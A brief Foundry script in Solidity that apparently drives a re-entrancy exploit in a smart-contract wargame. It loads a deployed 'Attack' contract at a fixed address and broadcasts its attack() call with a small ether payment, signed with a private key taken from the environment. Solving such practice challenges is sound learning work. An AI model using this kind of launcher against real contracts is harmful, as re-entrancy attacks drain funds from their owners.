// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import {Attack} from "src/reentrance/Attack.sol";

contract AttackScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        // address ownerAddress = vm.addr(deployerPrivateKey);
        Attack attack = Attack(0xfe806643569A1cCd168845da03b490Df191e6758);
        vm.startBroadcast(deployerPrivateKey);
        attack.attack{value:0.0005 ether}();
        vm.stopBroadcast();
    }
}